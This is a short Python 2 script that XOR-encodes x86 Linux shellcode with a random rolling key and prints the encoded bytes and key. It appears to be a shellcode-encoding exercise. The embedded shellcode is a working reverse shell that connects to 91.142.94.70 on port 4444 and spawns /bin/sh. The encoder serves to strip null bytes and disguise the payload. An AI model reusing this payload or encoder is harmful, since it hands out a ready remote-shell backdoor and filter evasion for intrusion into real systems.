import random

original_shellcode = ("\x6a\x66\x58\x31\xd2\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\x6a\x66\x58\x68\x5b\x8e\x5e\x46\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x87\xda\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x0b\x31\xd2\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80")

random_key = random.randint(0,255)

encoded_shellcode = []
encoded_shellcode.append(random_key)

for i in range(0, len(original_shellcode)):
    encoded_symbol = ord(original_shellcode[i]) ^ encoded_shellcode[i]
    encoded_shellcode.append(encoded_symbol)
    result_shellcode = (",".join("0x%02x" %c for c in encoded_shellcode))
if "0x00" in result_shellcode:
    print "Shellcode contains null bytes! Choose another port"
else:
    print "Shellcode: " + result_shellcode
    print "Key: " + str(random_key)
